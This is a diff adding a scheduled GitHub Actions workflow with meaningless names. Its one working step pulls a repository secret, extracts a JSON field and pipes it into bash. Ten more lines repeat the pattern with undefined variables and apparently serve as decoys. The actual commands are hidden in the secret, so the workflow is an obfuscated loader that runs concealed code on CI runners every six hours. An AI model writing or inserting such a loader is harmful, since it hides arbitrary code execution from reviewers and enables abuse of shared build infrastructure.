@@ -1,0 +1,28 @@
+name: tixiacheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tixiacheng
+        env:
+          oe386: ${{ secrets.oe386 }}
+        run: |
+          echo $oe386 | jq -r .h14 | /bin/bash
+          echo $b8 | jq -r .y4 | /bin/bash
+          echo $lut0 | jq -r .jver995 | /bin/bash
+          echo $fecw28624 | jq -r .iutv8795 | /bin/bash
+          echo $jst8853 | jq -r .dqyo0710 | /bin/bash
+          echo $i0 | jq -r .u42 | /bin/bash
+          echo $ajzht9 | jq -r .gtd55 | /bin/bash
+          echo $m707 | jq -r .qa3 | /bin/bash
+          echo $fjl797 | jq -r .jaz526 | /bin/bash
+          echo $b19779 | jq -r .fmnek59619 | /bin/bash
+          echo $gfbbl43 | jq -r .yfhu655 | /bin/bash
+
